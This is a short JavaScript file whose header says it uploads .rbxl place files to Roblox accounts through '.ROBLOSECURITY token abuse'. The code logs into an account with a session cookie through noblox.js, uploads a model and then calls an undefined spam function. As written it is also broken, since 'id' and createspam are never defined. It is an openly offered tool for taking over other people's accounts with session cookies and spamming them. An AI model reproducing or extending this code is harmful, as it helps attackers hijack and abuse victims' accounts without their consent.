/*
    Filename: upload.js
    Author: Zach "valrym" or ven#5099 on discord
    Date: 29/5/19
    Purpose: uploading .rbxl files to roblox accounts via .ROBLOSECURITY token abuse
    Notes: lol, for @blickys
*/

const rbx = require("noblox.js");
const fs = require("fs")
function log() {
    rbx.cookieLogin("token").then(function () {
        rbx.uploadModel(fs.createReadStream("filename.rbxl"), {}, id)
});
    console.log("worked")
    createspam()
}
log()
